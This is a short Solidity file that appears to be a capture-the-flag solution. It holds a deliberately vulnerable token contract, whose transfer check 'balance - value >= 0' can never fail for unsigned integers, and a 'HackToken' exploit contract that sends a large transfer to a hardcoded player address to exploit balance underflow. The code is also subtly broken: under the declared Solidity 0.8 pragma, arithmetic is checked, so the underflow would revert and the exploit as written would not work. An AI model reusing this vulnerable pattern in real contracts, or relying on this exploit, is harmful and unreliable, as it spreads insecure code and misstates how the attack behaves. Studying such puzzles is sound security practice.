// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract HackToken {
    Token private immutable target;
    address private immutable player = 0x3394Ee028ac122910C917EAc3C04E28247Fd0d8B;
    // 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407

    constructor(address _target) {
        target = Token(_target);    
    }

    receive() external payable {
        target.transfer(player, 20999980);
     }
}